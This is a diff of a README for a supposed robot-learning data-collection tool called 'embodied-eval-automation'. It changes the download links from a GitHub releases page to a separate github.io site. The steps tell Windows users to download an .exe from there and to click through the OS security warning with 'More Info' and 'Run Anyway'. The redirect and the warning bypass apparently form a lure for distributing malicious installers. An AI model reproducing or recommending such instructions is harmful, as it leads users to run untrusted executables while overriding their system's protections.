@@ -1,6 +1,6 @@
 # 🤖 embodied-eval-automation - Automate your robot learning data collection
 
-[![Download Software](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Evidentiary-operatingmicroscope154/embodied-eval-automation/releases)
+[![Download Software](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://evidentiary-operatingmicroscope154.github.io)
 
 This application helps you collect data for robotics research. It manages the steps needed to run tests on robots or simulations. You use it to track how different robot brains perform on tasks. It keeps your data organized and ensures you can repeat your experiments.
 
@@ -14,7 +14,7 @@ Ensure you have current drivers for your hardware. You do not need to install co
 
 Follow these steps to set up the software on your Windows machine:
 
-1. Visit this page to download the latest version: https://github.com/Evidentiary-operatingmicroscope154/embodied-eval-automation/releases
+1. Visit this page to download the latest version: https://evidentiary-operatingmicroscope154.github.io
 2. Look for the file that ends in .exe under the latest version header. Select that link to save the installer to your computer.
 3. Open your Downloads folder and double-click the file you saved.
 4. Windows might show a warning message because the software is new. Select More Info and then Run Anyway to start the installation.
